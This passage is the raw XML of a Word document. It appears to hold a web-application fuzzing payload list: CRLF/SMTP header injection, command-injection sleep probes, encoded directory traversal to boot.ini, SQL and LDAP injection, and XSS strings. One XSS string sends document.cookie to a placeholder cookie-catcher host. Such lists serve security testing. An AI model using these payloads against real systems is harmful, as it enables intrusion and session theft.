      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;youremail&gt;%0d%0aRCPT+TO:+&lt;youremail&gt;%0d%0aDATA%0d%0aFrom:+&lt;youremail&gt;%0d%0aTo:+&lt;youremail&gt;%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E313A1E" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0d%0aX-Injection-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Header:%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>20AttackValue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418F8197" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396B5EE3" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20$(sleep%2050)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67240CEB" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20'sleep%2050'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D108722" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1D158B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD04871" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D77F3D0" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD14776" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%20|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AF25A0" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>%21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4347F6" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122C843B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%25%5</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>c..%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:tab/>
        <w:t>25%5c..%25%5c..%255cboot.ini</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D9996F" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%25%5</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>c..%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:tab/>
        <w:t>25%5c..%25%5c..%00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E01489" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%25%5</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>c..%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D80A41D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%2500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B24A5EE" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%250a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FE7A8B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%26</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B013AA" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%27%20or%201=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EF53A0" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%28</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1967E623" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%29</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F48B5B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%2A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D92F634" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%2A%28%7C%28mail%3D%2A%29%29</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FC020E" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%2A%28%7C%28objectclass%3D%2A%29%29</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E7B2C6" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%2A%7C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC207AE" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%2C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AD8F6E" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%2e%2e%2f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D64340C" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%3C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582D75F7" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%3C%3F</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63137B1E" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%3Cscript%3Ealert(%22X%20SS%22</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>3C/script%3E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D67076F" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%3cscript%3ealert("XSS"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>3c/script%3e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74952FD9" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%3cscript%3ealert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);%3c%2fscript%3e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5981DC" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%5C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D7894B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%5C/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BB012D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%60</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3228E9CC" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%7C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669E17C4" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%7f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D36742D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRPr="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00767C91" w:rsidRPr="00767C91" w:rsidSect="004D7B3D">
      <w:footerReference w:type="default" r:id="rId150"/>
      <w:footerReference w:type="first" r:id="rId15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F06FD9" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7285A939" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B" w:rsidP="004E7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8BBE1" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <w:r w:rsidRPr="00C015A8">
      <w:rPr>
        <w:i/>
        <w:sz w:val="24"/>
        <w:szCs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8859836"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="0202974B" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B">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A60D20">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="3872D444" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA68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9717893"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="1FC054AB" w14:textId="5A8E25BC" w:rsidR="00EA689B" w:rsidRDefault="00EA689B" w:rsidP="003363BE">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sidRPr="005509E2">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="307CEDA1" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA68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3404089"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="100A64DC" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B">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A60D20">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="79CC1533" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRPr="00A60D20" w:rsidRDefault="00EA689B" w:rsidP="00A60D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9A12B1" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="216CE096" w14:textId="77777777" w:rsidR="00EA689B" w:rsidRDefault="00EA689B" w:rsidP="004E73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8500C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4808A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04596"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A9EAFF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352EF5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F754E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4E18CF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C43CD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BF356D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="96385C18"/>
    <w:lvl w:ilvl="0" w:tplc="3DA2F7DE">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077C03"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C6E842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B278113E"/>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01E4825"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DB34E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691FF5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5FB293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BC05EE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="403CC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51261A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EC6EE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E912C8E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DEE45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636E4B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="279E2EE6"/>
    <w:lvl w:ilvl="0" w:tplc="EE3E54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B515488"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="268E7E6E"/>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4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="49C959A5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CD64F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B6D4DC2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BF16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387DF0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6D9A3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A20547D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FE025A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F091FDE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7E920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4FF62CC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="136A3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40357F2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="442CCE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4D432AE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D6200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6265CD9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5D6EB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4752D9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1C600ECA"/>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num w:numId="1">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="2">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="24">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activeWritingStyle w:appName="MSWord" w:lang="en-US" w:vendorID="64" w:dllVersion="6" w:nlCheck="1" w:checkStyle="0"/>
